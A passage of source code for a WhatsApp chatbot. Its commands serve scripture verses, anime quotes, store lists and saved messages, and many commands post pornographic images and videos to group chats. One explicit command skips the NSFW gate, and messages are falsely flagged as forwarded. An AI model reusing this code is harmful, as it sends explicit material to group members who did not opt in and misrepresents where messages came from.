      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcyuta(gitaVerse)
    if (json.audio_link) {
      Yuta.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
			case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcyuta(quranSurah)

    if (json.data.recitation.full) {
      Yuta.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcyuta(`Error: ${error.message}`)
  }
  }
  break
			case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygcyuta(`Error: ${error.message}`)
  }
  }
  break
			case 'addlist':
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcyuta(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return replygcyuta(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await Yuta.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(m.chat, args1, args2, true, `${mem}`, db_respon_list)
replygcyuta(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
replygcyuta(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (db_respon_list.length === 0) return replygcyuta(`There is no message list in the database yet`)
if (!q) return replygcyuta(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(m.chat, q, db_respon_list)) return replygcyuta(`Item list by Name *${q}* not in the database!`)
delResponList(m.chat, q, db_respon_list)
replygcyuta(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcyuta(teks)
}
break
			case 'setprefix':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!text) return replygcyuta(`Example : ${prefix + command} #`)
                global.xprefix = text
                replygcyuta(`Prefix successfully changed to ${text}`)
                break
			case 'addmsg': {
	if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!m.quoted) return replygcyuta('Reply Message You Want To Save In Database')
                if (!text) return replygcyuta(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return replygcyuta(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcyuta(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcyuta(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return replygcyuta(`'${text}' not listed in the message list`)
                Yuta.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcyuta(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return replygcyuta(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcyuta(`Successfully deleted '${text}' from the message list`)
            }
	    break
			case 'setcmd': {
                if (!m.quoted) return replygcyuta('Reply Message!')
                if (!m.quoted.fileSha256) return replygcyuta('SHA256 Hash Missing')
                if (!text) return replygcyuta(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcyuta('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcyuta(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcyuta(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcyuta('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                replygcyuta(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                Yuta.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!m.quoted) return replygcyuta('Reply Message!')
                if (!m.quoted.fileSha256) return replygcyuta('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygcyuta('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygcyuta('Done!')
            }
            break
			case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!AntiNsfw) return replygcyuta(mess.nsfw)
                replygcyuta(mess.loading)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'trap' :{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-neko' :
case 'hneko' :{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!AntiNsfw) return replygcyuta(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-waifu' :
case 'nwaifu' :{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break 
case 'animespank':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'blowjob':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'cuckold':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'eba':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'pussy':{
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
	if (!AntiNsfw) return replygcyuta(mess.nsfw)
replygcyuta(mess.loading)
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'yuri':{
